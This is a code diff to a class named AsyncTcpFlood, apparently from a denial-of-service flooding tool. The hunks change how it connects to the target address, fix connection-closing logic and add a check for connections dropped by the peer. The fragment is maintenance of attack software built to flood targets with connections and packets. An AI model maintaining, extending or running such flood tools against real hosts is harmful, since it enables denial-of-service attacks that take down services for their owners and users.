@@ -668,7 +668,7 @@ class AsyncTcpFlood(HttpFlood):
             )
         else:
             conn = asyncio.open_connection(
-                host=self._target.host, port=self._target.port, ssl=ssl_ctx,
+                host=self._addr, port=self._target.port, ssl=ssl_ctx,
                 server_hostname=server_hostname)
         async with timeout(self._settings.connect_timeout_seconds):
             reader, writer = await conn
@@ -693,7 +693,7 @@ class AsyncTcpFlood(HttpFlood):
     async def _close_connection(self, writer: asyncio.StreamWriter) -> None:
         if writer.can_write_eof():
             writer.write_eof()
-        if self._settings.low_level_transport:
+        elif self._settings.low_level_transport:
             writer.get_extra_info("socket")._sock.close()
             self._stats.track_close_connection()
         else:
@@ -702,6 +702,10 @@ class AsyncTcpFlood(HttpFlood):
             task.add_done_callback(self._closed_connection)
 
     async def _send_packet(self, writer: asyncio.StreamWriter, payload: bytes) -> None:
+        # this means that connection_lost was caused by peer
+        if getattr(writer.transport, "_conn_lost", 0):
+            raise RuntimeError("Connection lost unexpectedly (transport)")
+
         if self._settings.low_level_transport:
             sock = writer.get_extra_info("socket")._sock
             async with timeout(self._settings.drain_timeout_seconds):
